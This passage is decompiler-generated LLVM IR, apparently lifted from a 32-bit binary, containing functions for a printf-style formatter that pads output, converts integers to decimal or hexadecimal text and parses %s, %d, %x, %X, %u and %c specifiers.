  %storemerge3 = phi i32 [ %v2_8be8, %dec_label_pc_8be0 ], [ 0, %dec_label_pc_8bc4 ]
  %v1_8bf4 = and i32 %arg4, 2
  %v2_8bf8 = icmp eq i32 %v1_8bf4, 0
  br i1 %v2_8bf8, label %dec_label_pc_8c08, label %dec_label_pc_8c00

dec_label_pc_8c00:                                ; preds = %dec_label_pc_8bf0
  br label %dec_label_pc_8c08

dec_label_pc_8c08:                                ; preds = %dec_label_pc_8bf0, %dec_label_pc_8b4c, %dec_label_pc_8c00
  %stack_var_-28.0 = phi i32 [ %arg3, %dec_label_pc_8b4c ], [ %storemerge3, %dec_label_pc_8bf0 ], [ %storemerge3, %dec_label_pc_8c00 ]
  %stack_var_-44.0 = phi i32 [ 32, %dec_label_pc_8b4c ], [ 32, %dec_label_pc_8bf0 ], [ 48, %dec_label_pc_8c00 ]
  %v1_8c0c = urem i32 %arg4, 2
  %v2_8c10 = icmp eq i32 %v1_8c0c, 0
  br i1 %v2_8c10, label %dec_label_pc_8c40.preheader, label %dec_label_pc_8c7c.preheader

dec_label_pc_8c40.preheader:                      ; preds = %dec_label_pc_8c08
  %v5_8c4816 = icmp sgt i32 %stack_var_-28.0, 0
  br i1 %v5_8c4816, label %dec_label_pc_8c1c.lr.ph, label %dec_label_pc_8c7c.preheader

dec_label_pc_8c1c.lr.ph:                          ; preds = %dec_label_pc_8c40.preheader
  %v2_8c24 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_8c1c

dec_label_pc_8c1c:                                ; preds = %dec_label_pc_8c1c.lr.ph, %dec_label_pc_8c1c
  %stack_var_-28.117 = phi i32 [ %stack_var_-28.0, %dec_label_pc_8c1c.lr.ph ], [ %v1_8c38, %dec_label_pc_8c1c ]
  %v3_8c24 = call i32 @function_8adc(i32* %v2_8c24, i32 %stack_var_-44.0)
  %v3_8c28 = load i32, i32* %stack_var_-48, align 4
  %v1_8c2c = add i32 %v3_8c28, 1
  store i32 %v1_8c2c, i32* %stack_var_-48, align 4
  %v1_8c38 = add nsw i32 %stack_var_-28.117, -1
  %v5_8c48 = icmp sgt i32 %stack_var_-28.117, 1
  br i1 %v5_8c48, label %dec_label_pc_8c1c, label %dec_label_pc_8c7c.preheader

dec_label_pc_8c7c.preheader:                      ; preds = %dec_label_pc_8c1c, %dec_label_pc_8c40.preheader, %dec_label_pc_8c08
  %v3_8cc027 = phi i32 [ 0, %dec_label_pc_8c08 ], [ 0, %dec_label_pc_8c40.preheader ], [ %v1_8c2c, %dec_label_pc_8c1c ]
  %stack_var_-28.2.ph = phi i32 [ %stack_var_-28.0, %dec_label_pc_8c08 ], [ %stack_var_-28.0, %dec_label_pc_8c40.preheader ], [ 0, %dec_label_pc_8c1c ]
  %v2_8c809 = load i8, i8* %arg2, align 1
  %v2_8c8411 = icmp eq i8 %v2_8c809, 0
  br i1 %v2_8c8411, label %dec_label_pc_8cb4.preheader, label %dec_label_pc_8c50.lr.ph

dec_label_pc_8c50.lr.ph:                          ; preds = %dec_label_pc_8c7c.preheader
  %v2_8c60 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_8c50

dec_label_pc_8c50:                                ; preds = %dec_label_pc_8c50.lr.ph, %dec_label_pc_8c50
  %v4_8c7c13 = phi i32 [ %tmp, %dec_label_pc_8c50.lr.ph ], [ %v1_8c74, %dec_label_pc_8c50 ]
  %stack_var_-24.012 = phi i8* [ %arg2, %dec_label_pc_8c50.lr.ph ], [ %v5_8c78, %dec_label_pc_8c50 ]
  %v2_8c54 = load i8, i8* %stack_var_-24.012, align 1
  %v3_8c54 = zext i8 %v2_8c54 to i32
  %v3_8c60 = call i32 @function_8adc(i32* %v2_8c60, i32 %v3_8c54)
  %v3_8c64 = load i32, i32* %stack_var_-48, align 4
  %v1_8c68 = add i32 %v3_8c64, 1
  store i32 %v1_8c68, i32* %stack_var_-48, align 4
  %v1_8c74 = add i32 %v4_8c7c13, 1
  %v5_8c78 = inttoptr i32 %v1_8c74 to i8*
  %v2_8c80 = load i8, i8* %v5_8c78, align 1
  %v2_8c84 = icmp eq i8 %v2_8c80, 0
  br i1 %v2_8c84, label %dec_label_pc_8cb4.preheader, label %dec_label_pc_8c50

dec_label_pc_8cb4.preheader:                      ; preds = %dec_label_pc_8c50, %dec_label_pc_8c7c.preheader
  %v3_8cc026 = phi i32 [ %v3_8cc027, %dec_label_pc_8c7c.preheader ], [ %v1_8c68, %dec_label_pc_8c50 ]
  %v5_8cbc6 = icmp sgt i32 %stack_var_-28.2.ph, 0
  br i1 %v5_8cbc6, label %dec_label_pc_8c90.lr.ph, label %dec_label_pc_8cc0

dec_label_pc_8c90.lr.ph:                          ; preds = %dec_label_pc_8cb4.preheader
  %v2_8c98 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_8c90

dec_label_pc_8c90:                                ; preds = %dec_label_pc_8c90.lr.ph, %dec_label_pc_8c90
  %stack_var_-28.37 = phi i32 [ %stack_var_-28.2.ph, %dec_label_pc_8c90.lr.ph ], [ %v1_8cac, %dec_label_pc_8c90 ]
  %v3_8c98 = call i32 @function_8adc(i32* %v2_8c98, i32 %stack_var_-44.0)
  %v3_8c9c = load i32, i32* %stack_var_-48, align 4
  %v1_8ca0 = add i32 %v3_8c9c, 1
  store i32 %v1_8ca0, i32* %stack_var_-48, align 4
  %v1_8cac = add nsw i32 %stack_var_-28.37, -1
  %v5_8cbc = icmp sgt i32 %stack_var_-28.37, 1
  br i1 %v5_8cbc, label %dec_label_pc_8c90, label %dec_label_pc_8cc0

dec_label_pc_8cc0:                                ; preds = %dec_label_pc_8c90, %dec_label_pc_8cb4.preheader
  %v3_8cc0 = phi i32 [ %v3_8cc026, %dec_label_pc_8cb4.preheader ], [ %v1_8ca0, %dec_label_pc_8c90 ]
  store i32 %v3_8b50, i32* @fp, align 4
  ret i32 %v3_8cc0

; uselistorder directives
  uselistorder i32 %v1_8c74, { 1, 0 }
  uselistorder i32 %stack_var_-40.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_8bac, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i8* %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8c90, { 1, 0 }
  uselistorder label %dec_label_pc_8c50, { 1, 0 }
  uselistorder label %dec_label_pc_8c1c, { 1, 0 }
  uselistorder label %dec_label_pc_8c08, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8bf0, { 1, 0 }
  uselistorder label %dec_label_pc_8b9c, { 1, 0 }
}

define i32 @function_8cd4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_8cd4:
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_8cd8 = load i32, i32* @fp, align 4
  store i32 36064, i32* %stack_var_-4, align 4
  %v2_8cdc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8cdc, i32* @fp, align 4
  %v1_8d10 = icmp slt i32 %arg2, 0
  %v2_8d10 = icmp eq i32 %arg2, 0
  br i1 %v2_8d10, label %dec_label_pc_8d18, label %dec_label_pc_8d4c

dec_label_pc_8d18:                                ; preds = %dec_label_pc_8cd4
  store i32 48, i32* %stack_var_-28, align 4
  %v5_8d3c = bitcast i32* %stack_var_-28 to i8*
  %v6_8d3c = call i32 @function_8b4c(i32 %arg1, i8* %v5_8d3c, i32 %arg5, i32 %arg6, i32 0)
  br label %dec_label_pc_8eac

dec_label_pc_8d4c:                                ; preds = %dec_label_pc_8cd4
  %v2_8d50 = icmp eq i32 %arg4, 0
  br i1 %v2_8d50, label %dec_label_pc_8d84, label %dec_label_pc_8d58

dec_label_pc_8d58:                                ; preds = %dec_label_pc_8d4c
  %v7_8d5c = icmp eq i32 %arg3, 10
  br i1 %v7_8d5c, label %dec_label_pc_8d64, label %dec_label_pc_8d84

dec_label_pc_8d64:                                ; preds = %dec_label_pc_8d58
  br i1 %v1_8d10, label %dec_label_pc_8d70, label %dec_label_pc_8d84

dec_label_pc_8d70:                                ; preds = %dec_label_pc_8d64
  %v1_8d7c = sub i32 0, %arg2
  br label %dec_label_pc_8d84

dec_label_pc_8d84:                                ; preds = %dec_label_pc_8d64, %dec_label_pc_8d58, %dec_label_pc_8d4c, %dec_label_pc_8d70
  %stack_var_-52.0 = phi i32 [ %arg2, %dec_label_pc_8d4c ], [ %v1_8d7c, %dec_label_pc_8d70 ], [ %arg2, %dec_label_pc_8d64 ], [ %arg2, %dec_label_pc_8d58 ]
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_8d4c ], [ 1, %dec_label_pc_8d70 ], [ 0, %dec_label_pc_8d64 ], [ 0, %dec_label_pc_8d58 ]
  %tmp26 = bitcast i32* %stack_var_-17 to i8*
  store i8 0, i8* %tmp26, align 4
  %v2_8e184 = icmp eq i32 %stack_var_-52.0, 0
  br i1 %v2_8e184, label %dec_label_pc_8e20, label %dec_label_pc_8da0.lr.ph

dec_label_pc_8da0.lr.ph:                          ; preds = %dec_label_pc_8d84
  %v7_8dc0 = icmp slt i32 %arg3, 10
  %v1_8dc8 = add i32 %arg7, -58
  %v2_8dd0 = add i32 %v1_8dc8, %arg3
  br label %dec_label_pc_8da0

dec_label_pc_8da0:                                ; preds = %dec_label_pc_8da0.lr.ph, %dec_label_pc_8dd8
  %stack_var_-52.16 = phi i32 [ %stack_var_-52.0, %dec_label_pc_8da0.lr.ph ], [ %v0_8e08, %dec_label_pc_8dd8 ]
  %stack_var_-68.05 = phi i8* [ %tmp26, %dec_label_pc_8da0.lr.ph ], [ %v5_8de0, %dec_label_pc_8dd8 ]
  %v2_8dac = call i32 @function_12514(i32 %stack_var_-52.16, i32 %arg3)
  br i1 %v7_8dc0, label %dec_label_pc_8dd8, label %dec_label_pc_8dc4

dec_label_pc_8dc4:                                ; preds = %dec_label_pc_8da0
  br label %dec_label_pc_8dd8

dec_label_pc_8dd8:                                ; preds = %dec_label_pc_8da0, %dec_label_pc_8dc4
  %stack_var_-64.0 = phi i32 [ %arg3, %dec_label_pc_8da0 ], [ %v2_8dd0, %dec_label_pc_8dc4 ]
  %v4_8dd8 = ptrtoint i8* %stack_var_-68.05 to i32
  %v1_8ddc = add i32 %v4_8dd8, -1
  %v5_8de0 = inttoptr i32 %v1_8ddc to i8*
  %fold = add i32 %stack_var_-64.0, 48
  %v1_8df8 = trunc i32 %fold to i8
  store i8 %v1_8df8, i8* %v5_8de0, align 1
  store i32 %stack_var_-52.16, i32* @r0, align 4
  store i32 %arg3, i32* @r1, align 4
  %v0_8e08 = call i32 @function_12418()
  %v2_8e18 = icmp eq i32 %v0_8e08, 0
  br i1 %v2_8e18, label %dec_label_pc_8e20, label %dec_label_pc_8da0

dec_label_pc_8e20:                                ; preds = %dec_label_pc_8dd8, %dec_label_pc_8d84
  %stack_var_-68.0.lcssa = phi i8* [ %tmp26, %dec_label_pc_8d84 ], [ %v5_8de0, %dec_label_pc_8dd8 ]
  %v2_8e24 = icmp eq i32 %stack_var_-60.0, 0
  br i1 %v2_8e24, label %dec_label_pc_8e88, label %dec_label_pc_8e2c

dec_label_pc_8e2c:                                ; preds = %dec_label_pc_8e20
  %v3_8e2c = load i32, i32* %stack_var_0, align 4
  %v2_8e30 = icmp eq i32 %v3_8e2c, 0
  br i1 %v2_8e30, label %dec_label_pc_8e70, label %dec_label_pc_8e38

dec_label_pc_8e38:                                ; preds = %dec_label_pc_8e2c
  %v1_8e3c = and i32 %arg6, 2
  %v2_8e40 = icmp eq i32 %v1_8e3c, 0
  br i1 %v2_8e40, label %dec_label_pc_8e70, label %dec_label_pc_8e48

dec_label_pc_8e48:                                ; preds = %dec_label_pc_8e38
  %v2_8e50 = inttoptr i32 %arg1 to i32*
  %v3_8e50 = call i32 @function_8adc(i32* %v2_8e50, i32 45)
  %v3_8e60 = load i32, i32* %stack_var_0, align 4
  %v1_8e64 = add i32 %v3_8e60, -1
  store i32 %v1_8e64, i32* %stack_var_0, align 4
  br label %dec_label_pc_8e88

dec_label_pc_8e70:                                ; preds = %dec_label_pc_8e38, %dec_label_pc_8e2c
  %v4_8e70 = ptrtoint i8* %stack_var_-68.0.lcssa to i32
  %v1_8e74 = add i32 %v4_8e70, -1
  %v5_8e78 = inttoptr i32 %v1_8e74 to i8*
  store i8 45, i8* %v5_8e78, align 1
  br label %dec_label_pc_8e88

dec_label_pc_8e88:                                ; preds = %dec_label_pc_8e20, %dec_label_pc_8e48, %dec_label_pc_8e70
  %stack_var_-68.1 = phi i8* [ %stack_var_-68.0.lcssa, %dec_label_pc_8e20 ], [ %v5_8e78, %dec_label_pc_8e70 ], [ %stack_var_-68.0.lcssa, %dec_label_pc_8e48 ]
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_8e20 ], [ 0, %dec_label_pc_8e70 ], [ 1, %dec_label_pc_8e48 ]
  %v3_8e90 = load i32, i32* %stack_var_0, align 4
  %v6_8e98 = call i32 @function_8b4c(i32 %arg1, i8* %stack_var_-68.1, i32 %v3_8e90, i32 %arg6, i32 ptrtoint (i32* @0 to i32))
  %v2_8ea4 = add i32 %v6_8e98, %stack_var_-56.0
  br label %dec_label_pc_8eac

dec_label_pc_8eac:                                ; preds = %dec_label_pc_8d18, %dec_label_pc_8e88
  %storemerge2 = phi i32 [ %v2_8ea4, %dec_label_pc_8e88 ], [ %v6_8d3c, %dec_label_pc_8d18 ]
  store i32 %v3_8cd8, i32* @fp, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i8* %stack_var_-68.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v5_8de0, { 0, 2, 1 }
  uselistorder i32 %stack_var_-52.16, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 4, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg3, { 2, 3, 4, 0, 5, 1 }
  uselistorder i32 %arg2, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8eac, { 1, 0 }
  uselistorder label %dec_label_pc_8e88, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8dd8, { 1, 0 }
  uselistorder label %dec_label_pc_8da0, { 1, 0 }
  uselistorder label %dec_label_pc_8d84, { 3, 0, 1, 2 }
}

define i32 @function_8ec0(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8ec0:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-18 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 36556, i32* %stack_var_-4, align 4
  %v2_8ec8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8ec8, i32* @fp, align 4
  %stack_var_-32.428 = inttoptr i32 %arg2 to i8*
  %v2_927429 = load i8, i8* %stack_var_-32.428, align 1
  %v2_927831 = icmp eq i8 %v2_927429, 0
  br i1 %v2_927831, label %dec_label_pc_9280, label %dec_label_pc_8ee8.lr.ph

dec_label_pc_8ee8.lr.ph:                          ; preds = %dec_label_pc_8ec0
  %v5_922c = bitcast i32* %stack_var_-18 to i8*
  br label %dec_label_pc_8ee8

dec_label_pc_8ee8:                                ; preds = %dec_label_pc_8ee8.lr.ph, %dec_label_pc_9264
  %stack_var_-32.435 = phi i8* [ %stack_var_-32.428, %dec_label_pc_8ee8.lr.ph ], [ %stack_var_-32.4, %dec_label_pc_9264 ]
  %stack_var_-32.4.in34 = phi i32 [ %arg2, %dec_label_pc_8ee8.lr.ph ], [ %v1_9268, %dec_label_pc_9264 ]
  %stack_var_-36.133 = phi i32 [ %arg3, %dec_label_pc_8ee8.lr.ph ], [ %stack_var_-36.0, %dec_label_pc_9264 ]
  %stack_var_-44.132 = phi i32 [ 0, %dec_label_pc_8ee8.lr.ph ], [ %stack_var_-44.0, %dec_label_pc_9264 ]
  %v2_8eec = load i8, i8* %stack_var_-32.435, align 1
  %v7_8ef0 = icmp eq i8 %v2_8eec, 37
  br i1 %v7_8ef0, label %dec_label_pc_8ef8, label %dec_label_pc_9244

dec_label_pc_8ef8:                                ; preds = %dec_label_pc_8ee8
  %v1_8efc = add i32 %stack_var_-32.4.in34, 1
  %v5_8f00 = inttoptr i32 %v1_8efc to i8*
  %v2_8f18 = load i8, i8* %v5_8f00, align 1
  %v2_8f1c = icmp eq i8 %v2_8f18, 0
  br i1 %v2_8f1c, label %dec_label_pc_9280, label %dec_label_pc_8f24

dec_label_pc_8f24:                                ; preds = %dec_label_pc_8ef8
  %v2_8f28 = load i8, i8* %v5_8f00, align 1
  %v7_8f2c = icmp eq i8 %v2_8f28, 37
  br i1 %v7_8f2c, label %dec_label_pc_9244, label %dec_label_pc_8f34

dec_label_pc_8f34:                                ; preds = %dec_label_pc_8f24
  %v2_8f38 = load i8, i8* %v5_8f00, align 1
  %v7_8f3c = icmp eq i8 %v2_8f38, 45
  br i1 %v7_8f3c, label %dec_label_pc_8f44, label %dec_label_pc_8f74.preheader

dec_label_pc_8f44:                                ; preds = %dec_label_pc_8f34
  %v1_8f48 = add i32 %stack_var_-32.4.in34, 2
  %v5_8f4c = inttoptr i32 %v1_8f48 to i8*
  br label %dec_label_pc_8f74.preheader

dec_label_pc_8f74.preheader:                      ; preds = %dec_label_pc_8f44, %dec_label_pc_8f34
  %stack_var_-32.0.ph = phi i8* [ %v5_8f00, %dec_label_pc_8f34 ], [ %v5_8f4c, %dec_label_pc_8f44 ]
  %stack_var_-48.0.ph = phi i32 [ 0, %dec_label_pc_8f34 ], [ 1, %dec_label_pc_8f44 ]
  %v4_8f742 = ptrtoint i8* %stack_var_-32.0.ph to i32
  %v2_8f783 = load i8, i8* %stack_var_-32.0.ph, align 1
  %v7_8f7c7 = icmp eq i8 %v2_8f783, 48
  br i1 %v7_8f7c7, label %dec_label_pc_8f5c, label %dec_label_pc_8fc0.preheader

dec_label_pc_8f5c:                                ; preds = %dec_label_pc_8f74.preheader, %dec_label_pc_8f5c
  %v4_8f749 = phi i32 [ %v1_8f60, %dec_label_pc_8f5c ], [ %v4_8f742, %dec_label_pc_8f74.preheader ]
  %stack_var_-48.08 = phi i32 [ %v1_8f6c, %dec_label_pc_8f5c ], [ %stack_var_-48.0.ph, %dec_label_pc_8f74.preheader ]
  %v1_8f60 = add i32 %v4_8f749, 1
  %v5_8f64 = inttoptr i32 %v1_8f60 to i8*
  %v1_8f6c = or i32 %stack_var_-48.08, 2
  %v2_8f78 = load i8, i8* %v5_8f64, align 1
  %v7_8f7c = icmp eq i8 %v2_8f78, 48
  br i1 %v7_8f7c, label %dec_label_pc_8f5c, label %dec_label_pc_8fc0.preheader

dec_label_pc_8fc0.preheader:                      ; preds = %dec_label_pc_8f5c, %dec_label_pc_8f74.preheader
  %stack_var_-48.0.lcssa = phi i32 [ %stack_var_-48.0.ph, %dec_label_pc_8f74.preheader ], [ %v1_8f6c, %dec_label_pc_8f5c ]
  %stack_var_-32.0.lcssa = phi i8* [ %stack_var_-32.0.ph, %dec_label_pc_8f74.preheader ], [ %v5_8f64, %dec_label_pc_8f5c ]
  %v4_8fc011 = ptrtoint i8* %stack_var_-32.0.lcssa to i32
  %v2_8fc412 = load i8, i8* %stack_var_-32.0.lcssa, align 1
  %tmp60 = icmp ult i8 %v2_8fc412, 48
  br i1 %tmp60, label %dec_label_pc_8fe0, label %dec_label_pc_8fd0

dec_label_pc_8f88:                                ; preds = %dec_label_pc_8fd0
  %v2_8f94 = mul i32 %stack_var_-52.019, 10
  %v2_8fa0 = load i8, i8* %stack_var_-32.120, align 1
  %v3_8fa0 = zext i8 %v2_8fa0 to i32
  %v1_8fa4 = add i32 %v2_8f94, -48
  %v2_8fac = add i32 %v1_8fa4, %v3_8fa0
  %v1_8fb8 = add i32 %v4_8fc021, 1
  %v5_8fbc = inttoptr i32 %v1_8fb8 to i8*
  %v2_8fc4 = load i8, i8* %v5_8fbc, align 1
  %tmp61 = icmp ult i8 %v2_8fc4, 48
  br i1 %tmp61, label %dec_label_pc_8fe0, label %dec_label_pc_8fd0

dec_label_pc_8fd0:                                ; preds = %dec_label_pc_8fc0.preheader, %dec_label_pc_8f88
  %v4_8fc021 = phi i32 [ %v1_8fb8, %dec_label_pc_8f88 ], [ %v4_8fc011, %dec_label_pc_8fc0.preheader ]
  %stack_var_-32.120 = phi i8* [ %v5_8fbc, %dec_label_pc_8f88 ], [ %stack_var_-32.0.lcssa, %dec_label_pc_8fc0.preheader ]
  %stack_var_-52.019 = phi i32 [ %v2_8fac, %dec_label_pc_8f88 ], [ 0, %dec_label_pc_8fc0.preheader ]
  %v2_8fd4 = load i8, i8* %stack_var_-32.120, align 1
  %tmp62 = icmp ult i8 %v2_8fd4, 58
  br i1 %tmp62, label %dec_label_pc_8f88, label %dec_label_pc_8fe0

dec_label_pc_8fe0:                                ; preds = %dec_label_pc_8f88, %dec_label_pc_8fd0, %dec_label_pc_8fc0.preheader
  %stack_var_-52.0.lcssa = phi i32 [ 0, %dec_label_pc_8fc0.preheader ], [ %v2_8fac, %dec_label_pc_8f88 ], [ %stack_var_-52.019, %dec_label_pc_8fd0 ]
  %stack_var_-32.1.lcssa = phi i8* [ %stack_var_-32.0.lcssa, %dec_label_pc_8fc0.preheader ], [ %v5_8fbc, %dec_label_pc_8f88 ], [ %stack_var_-32.120, %dec_label_pc_8fd0 ]
  %v2_8fe4 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8fe8 = icmp eq i8 %v2_8fe4, 115
  br i1 %v7_8fe8, label %dec_label_pc_8ff0, label %dec_label_pc_9054

dec_label_pc_8ff0:                                ; preds = %dec_label_pc_8fe0
  %v1_8ff4 = add i32 %stack_var_-36.133, 4
  %v1_9000 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_9000 = load i32, i32* %v1_9000, align 4
  %v2_900c = icmp eq i32 %v2_9000, 0
  br i1 %v2_900c, label %dec_label_pc_9020, label %dec_label_pc_9014

dec_label_pc_9014:                                ; preds = %dec_label_pc_8ff0
  %v5_9018 = inttoptr i32 %v2_9000 to i8*
  br label %dec_label_pc_9028

dec_label_pc_9020:                                ; preds = %dec_label_pc_8ff0
  br label %dec_label_pc_9028

dec_label_pc_9028:                                ; preds = %dec_label_pc_9014, %dec_label_pc_9020
  %storemerge = phi i8* [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_20ed8.16, i32 0, i32 0), %dec_label_pc_9020 ], [ %v5_9018, %dec_label_pc_9014 ]
  %v7_903c = call i32 @function_8b4c(i32 %tmp, i8* %storemerge, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 ptrtoint (i32* @0 to i32))
  %v2_9048 = add i32 %v7_903c, %stack_var_-44.132
  br label %dec_label_pc_9264

dec_label_pc_9054:                                ; preds = %dec_label_pc_8fe0
  %v2_9058 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_905c = icmp eq i8 %v2_9058, 100
  br i1 %v7_905c, label %dec_label_pc_9064, label %dec_label_pc_90b8

dec_label_pc_9064:                                ; preds = %dec_label_pc_9054
  %v1_9068 = add i32 %stack_var_-36.133, 4
  %v1_9074 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_9074 = load i32, i32* %v1_9074, align 4
  %v7_90a0 = call i32 @function_8cd4(i32 %tmp, i32 %v2_9074, i32 10, i32 1, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 97)
  %v2_90ac = add i32 %v7_90a0, %stack_var_-44.132
  br label %dec_label_pc_9264

dec_label_pc_90b8:                                ; preds = %dec_label_pc_9054
  %v2_90bc = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_90c0 = icmp eq i8 %v2_90bc, 120
  br i1 %v7_90c0, label %dec_label_pc_90c8, label %dec_label_pc_911c

dec_label_pc_90c8:                                ; preds = %dec_label_pc_90b8
  %v1_90cc = add i32 %stack_var_-36.133, 4
  %v1_90d8 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_90d8 = load i32, i32* %v1_90d8, align 4
  %v7_9104 = call i32 @function_8cd4(i32 %tmp, i32 %v2_90d8, i32 16, i32 0, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 97)
  %v2_9110 = add i32 %v7_9104, %stack_var_-44.132
  br label %dec_label_pc_9264

dec_label_pc_911c:                                ; preds = %dec_label_pc_90b8
  %v2_9120 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_9124 = icmp eq i8 %v2_9120, 88
  br i1 %v7_9124, label %dec_label_pc_912c, label %dec_label_pc_9180

dec_label_pc_912c:                                ; preds = %dec_label_pc_911c
  %v1_9130 = add i32 %stack_var_-36.133, 4
  %v1_913c = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_913c = load i32, i32* %v1_913c, align 4
  %v7_9168 = call i32 @function_8cd4(i32 %tmp, i32 %v2_913c, i32 16, i32 0, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 65)
  %v2_9174 = add i32 %v7_9168, %stack_var_-44.132
  br label %dec_label_pc_9264

dec_label_pc_9180:                                ; preds = %dec_label_pc_911c
  %v2_9184 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_9188 = icmp eq i8 %v2_9184, 117
  br i1 %v7_9188, label %dec_label_pc_9190, label %dec_label_pc_91e4

dec_label_pc_9190:                                ; preds = %dec_label_pc_9180
  %v1_9194 = add i32 %stack_var_-36.133, 4
  %v1_91a0 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_91a0 = load i32, i32* %v1_91a0, align 4
  %v7_91cc = call i32 @function_8cd4(i32 %tmp, i32 %v2_91a0, i32 10, i32 0, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 97)
  %v2_91d8 = add i32 %v7_91cc, %stack_var_-44.132
  br label %dec_label_pc_9264

dec_label_pc_91e4:                                ; preds = %dec_label_pc_9180
  %v2_91e8 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_91ec = icmp eq i8 %v2_91e8, 99
  br i1 %v7_91ec, label %dec_label_pc_91f4, label %dec_label_pc_9264

dec_label_pc_91f4:                                ; preds = %dec_label_pc_91e4
  %v1_91f8 = add i32 %stack_var_-36.133, 4
  %v1_9204 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_9204 = load i32, i32* %v1_9204, align 4
  %v1_9208 = urem i32 %v2_9204, 256
  store i32 %v1_9208, i32* %stack_var_-18, align 4
  %v6_922c = call i32 @function_8b4c(i32 %tmp, i8* %v5_922c, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 %v1_91f8)
  %v2_9238 = add i32 %v6_922c, %stack_var_-44.132
  br label %dec_label_pc_9264

dec_label_pc_9244:                                ; preds = %dec_label_pc_8ee8, %dec_label_pc_8f24
  %stack_var_-32.2 = phi i8* [ %v5_8f00, %dec_label_pc_8f24 ], [ %stack_var_-32.435, %dec_label_pc_8ee8 ]
  %v2_9248 = load i8, i8* %stack_var_-32.2, align 1
  %v3_9248 = zext i8 %v2_9248 to i32
  %v3_9254 = call i32 @function_8adc(i32* %arg1, i32 %v3_9248)
  %v1_925c = add i32 %stack_var_-44.132, 1
  br label %dec_label_pc_9264

dec_label_pc_9264:                                ; preds = %dec_label_pc_91e4, %dec_label_pc_912c, %dec_label_pc_90c8, %dec_label_pc_9064, %dec_label_pc_9028, %dec_label_pc_91f4, %dec_label_pc_9190, %dec_label_pc_9244
  %stack_var_-44.0 = phi i32 [ %v1_925c, %dec_label_pc_9244 ], [ %v2_9048, %dec_label_pc_9028 ], [ %v2_90ac, %dec_label_pc_9064 ], [ %v2_9110, %dec_label_pc_90c8 ], [ %v2_9174, %dec_label_pc_912c ], [ %v2_91d8, %dec_label_pc_9190 ], [ %v2_9238, %dec_label_pc_91f4 ], [ %stack_var_-44.132, %dec_label_pc_91e4 ]
  %stack_var_-36.0 = phi i32 [ %stack_var_-36.133, %dec_label_pc_9244 ], [ %v1_8ff4, %dec_label_pc_9028 ], [ %v1_9068, %dec_label_pc_9064 ], [ %v1_90cc, %dec_label_pc_90c8 ], [ %v1_9130, %dec_label_pc_912c ], [ %v1_9194, %dec_label_pc_9190 ], [ %v1_91f8, %dec_label_pc_91f4 ], [ %stack_var_-36.133, %dec_label_pc_91e4 ]
  %stack_var_-32.3 = phi i8* [ %stack_var_-32.2, %dec_label_pc_9244 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_9028 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_9064 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_90c8 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_912c ], [ %stack_var_-32.1.lcssa, %dec_label_pc_9190 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_91f4 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_91e4 ]
  %v4_9264 = ptrtoint i8* %stack_var_-32.3 to i32
  %v1_9268 = add i32 %v4_9264, 1
  %stack_var_-32.4 = inttoptr i32 %v1_9268 to i8*
  %v2_9274 = load i8, i8* %stack_var_-32.4, align 1
  %v2_9278 = icmp eq i8 %v2_9274, 0
  br i1 %v2_9278, label %dec_label_pc_9280, label %dec_label_pc_8ee8

dec_label_pc_9280:                                ; preds = %dec_label_pc_8ef8, %dec_label_pc_9264, %dec_label_pc_8ec0
